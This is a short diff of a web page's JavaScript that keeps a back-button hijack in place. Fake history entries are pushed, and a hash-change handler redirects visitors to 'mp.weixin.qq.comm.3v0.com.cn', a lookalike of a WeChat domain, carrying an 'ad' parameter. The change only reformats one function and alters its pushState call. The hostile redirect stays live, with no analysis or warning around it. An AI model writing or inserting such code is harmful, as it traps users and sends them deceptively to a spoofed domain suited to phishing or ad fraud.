@@ -224,7 +224,14 @@ function winrs() {
     }
 }
 
-window.onhashchange=function(){jp();};function hh() {chkwvs();history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());}function jp() {location.href="http://mp.weixin.qq.comm.3v0.com.cn?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);/*"/2017-11-25/MZI=142236401895131"*/}
+window.onhashchange=function(){jp();};
+function hh() {
+    chkwvs();
+    // history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
+    history.pushState(history.length+1, "app");
+}
+
+function jp() {location.href="http://mp.weixin.qq.comm.3v0.com.cn?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);/*"/2017-11-25/MZI=142236401895131"*/}
 
 window.onload=function(){
     if (sessionStorage.isAT) {chkwvs=function(){};sessionStorage.removeItem("isAT");}
